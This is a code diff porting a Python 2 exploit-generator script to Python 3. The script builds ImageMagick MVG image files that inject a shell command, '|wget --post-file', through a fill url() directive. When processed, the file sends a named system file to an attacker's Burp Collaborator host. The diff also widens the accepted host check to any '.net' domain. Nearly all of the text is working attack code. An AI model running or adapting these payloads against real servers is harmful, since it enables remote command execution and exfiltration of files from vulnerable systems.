@@ -17,7 +17,7 @@ name = """
 
 print(name)
 
-Collaborator=(raw_input("\n[*] Enter the Burp Collaborator Link> "))
+Collaborator=(input("\n[*] Enter the Burp Collaborator Link> "))
 
 command_1="""push graphic-context 
 viewbox 0 0 640 480
@@ -32,7 +32,7 @@ def check():
 		print("-"*20)
 		img.write(command_1)
 		img.close()
-		out = (raw_input("[*] Do you want to exit y/n> "))
+		out = (input("[*] Do you want to exit y/n> "))
 		if out == "y":
 			print("\nThanks")
 			exit()
@@ -48,7 +48,7 @@ def system_file():
 		print("-"*20)
 		img.write(command_2)
 		img.close()
-		out = (raw_input("[*] Do you want to exit y/n> "))
+		out = (input("[*] Do you want to exit y/n> "))
 		if out == "y":
 			print("\nThanks")
 			exit()
@@ -58,20 +58,20 @@ def system_file():
 			print("[*] Please select yes or no.")
 		
 
-if ".burpcollaborator.net" in Collaborator:
+if ".net" in Collaborator:
 	active = True
 	while active:
 		print("\n[0] for Exit")
 		print("[1] for Ping")
 		print("[2] for System File")
-		select = int(raw_input("\n[*] Select the option> "))
+		select = int(input("\n[*] Select the option> "))
 		if select == 0:
 			print("\nThanks")
 			exit()
 		elif select == 1:
 			check()
 		elif select == 2:
-			file =(raw_input("[*] Enter the System file name> "))
+			file =(input("[*] Enter the System file name> "))
 			command_2="""push graphic-context 
 viewbox 0 0 640 480
 fill 'url(https://example.com/image.jpg "|wget --post-file %s %s")'
